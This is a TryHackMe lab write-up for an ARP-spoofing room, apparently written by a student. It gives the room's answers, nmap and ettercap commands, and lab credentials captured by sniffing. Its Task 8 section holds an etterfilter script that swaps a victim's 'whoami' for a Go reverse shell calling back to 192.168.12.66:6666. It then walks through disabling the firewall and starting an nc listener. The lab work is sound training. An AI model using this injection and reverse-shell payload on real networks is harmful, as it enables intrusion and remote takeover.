# L2-MAC-Flooding-ARP-Spoofing
 <b> Tryhackme  L2 MAC Flooding &amp; ARP Spoofing writeup </b>
  
 <b> TASK 2 </b> <br>
  <b> Note The admin user is in the sudo group. I suggest using the root user to complete this room <br>
      sudo su (password : Layer2)</b><br>
  
  Q.1    Now, can you (re)gain access?(Yay/Nay).<br>
  Ans.   Yea <br>
  <b>TASK 3 </b><br>
  Q. 1 What is your IP address? <br>
  <b>  ip address show eth1 </b><br>
  Ans. 192.168.12.66 <br>
  <img src="nmap_task.png"><br>
  Q. 2 What's the network's CIDR prefix? <br>
  Ans. /24  <br>
  Q. 4 How many other live hosts are there? <br>
  <b>  nmap -sn 192.168.12.66/24 </b> <br>
  Ans. 2 <br>
  Q. 5 What's the hostname of the first host (lowest IP address) you've found? <br>
  Ans. alice <br>
   <b>TASK 4 </b> <br>
  Q. 1 Can you see any traffic from those hosts? (Yay/Nay) <br>
  Ans. yea <br>
  Q. 2 Who keeps sending packets to eve? <br>
  Ans. bob <br>
  Q. 3 What type of packets are sent? <br>
  Ans. icmp <br>
    <b>hint</b> for Q 3 & 4 see fig <br>
    <img src="task4.png" alt="tcpdump.pcap"><br>
  Q. 4 What's the size of their data section? (bytes) <br>
  Ans. 666 <br>
   <b> TASK 5 </b><br>
  Q. 1 What kind of packets is Alice continuously sending to Bob?  <br>
  Ans. icmp <br>
  Q. 2 What's the size of their data section? (bytes) <br>
  Ans. 1337           (same as Q 3 & 4 in task 4)<br> 
  <b>Task 6 </b><br>
  Q.1 Can ettercap establish a MITM in between Alice and Bob? (Yay/Nay) <br>
  Ans. nay <br>
  Q. 2 Would you expect a different result when attacking hosts without ARP packet validation enabled? (Yay/Na<br>
  Ans. yay <br>
   <b> TASk 7</b> <br>
    <b> Note : Use root user <br>
       sudo su   (password : Layer2) </b><br>
   Q. 1 Scan the network on eth1. Who's there? Enter their IP addresses in ascending order. <br>
   <b>nmap 192.168.12.0/24</b><br>
   Ans. 192.168.12.10, 192.168.12.20 <br>
    <img src="nmap_task7.png" alt="nmap 192.168.12.66/24"><br>
   Q. 2 Which machine has an open well-known port? <br>
   Ans. 192.168.12.20 <br>
   Q. 3 What is the port number? <br>
   Ans. 80 <br>
   Q. 4 Can you access the content behind the service from your current position? (Nay/Yay) <br>
   Ans. Nay <br>
   Q. 5 Can you see any meaningful traffic to or from that port passively sniffing on you interface eth1? (Nay/Yay) <br>
   Ans. Nay <br>
   Q. 6 Now launch the same ARP spoofing attack as in the previous task. Can you see some interesting traffic, now? (Nay/Yay) <br>
   Ans. Yay <br>
     To launch arp attack<b> ettercap -T -i eth1 -M arp</b><br>
     ettercap -T -i eth1 -M arp > myarp.txt  (read carefully Q 7,89,11,17 Ans found in myarp.txt)<br>
   Q. 7 Who is using that service? <br>
   Ans. alice <br>
   Q. 8 What's the hostname the requests are sent to? <br>
   Ans www.server.bob <br>
   <img src="task7_Q8.png" alt=""><br>
   Q. 9 Which file is being requested? <br>
   Ans. test.txt <br>
   Q. 10 What text is in the file?<br>
   <b>curl -u admin:s3cr3t_p4zz http://192.168.12.20/test.txt</b><br>
   Ans ok <br>
    <img src="task7 _Q10.png"><br>
   Q. 11 Which credentials are being used for authentication? (username:password) <br>
   Ans. admin:s3cr3t_P4zz <br>
   Q. 12 Now, stop the attack (by pressing q). What is ettercap doing in order to leave its man-in-the-middle position gracefully and undo the poisoning? <br>
   Ans. RE-ARPing the victims <br>
   Q. 13 Can you access the content behind that service, now, using the obtained credentials? (Nay/Yay) <br>
   Ans. Yay <br>
   Q. 14 What is the user.txt flag? <br>
   <b>curl -u admin:s3cr3t_p4zz http://192.168.12.20/user.txt </b><br>
   Ans. THM{..........}  <br>
   Q. 15 You should also have seen some  rather questionable kind of traffic. What kind of remote access (shell) does Alice have on the server? <br>
   Ans. reverse shell <br>
   Q. 16 What commands are being executed? Answer in the order they are being executed.<br>
   Ans. whoami, pwd, ls <br>
   <img src="command.png"><br>
   Q.17 Which of the listed files do you want? <br>
   Ans. root.txt <br>
   <img src="last_q.png"><br>
   <b>TASK 8 </b> <br>
   Q. 1 What is the root.txt flag? <br>
   Ans.  THM{........} <br>  
    <b> Read carefully each and every line in Task 8 module L2 MAC Flooding & ARP Spoofing on tryhackme</b><br>
    <b>Follow steps to find root flag</b><br>
    hint: follow these steps on ssh machine not on your local machine<br>
     step 1. copy and save in a whoami.ecf file  <br><br>
     note: if this payload not work download whoami.ecf file from repo <a href="whoami.ecf">Download</a><br>
     <b> 
   if (ip.proto == TCP && tcp.src == 4444 && search(DATA.data, "whoami") ) {
    log(DATA.data, "/root/ettercap.log");
    replace("whoami", "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"192.168.12.66:6666\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go &" );
    msg("###### ETTERFILTER: substituted 'whoami' with reverse shell. ######\n");
}
    </b><br>
    
 
 step 2. compile source code with etterfilter<br>
  <b>etterfilter whoami.ecf -o whoami.ef</b><br>
  step 3. Disable firewall <br>
    <b>sudo ufw disable  (password: Layer2)</b><br>
  step 4. open one another ssh session and start netcat listener<br>
  hint: use same port in source code and netcat listener<br>
  <b>nc -nvlp 6666 & </b><br>
  step 5. Run ettercap <br>
  <b>sudo ettercap -T -i eth1 -M arp -F whoami.ef </b><br><br>
  A few seconds after executing this command, you should see  "Connection received on 192.168.12.20 " on netcat listerer<br>
  step 6. on netcat listener type "fg" to foreground listener<br>
  
  Enjoy reverse shell
  
  <img src="root_flag.png"><br>
  
      
      
      
      
      
      Thank you 
      this is my first writeup, if i made any mistake foregive me.
      if you have any questions connect with me on LinkedIn.(use tryhackme to get my LinkedIn Id).
      
      
      Ajeet Kumar
   
   
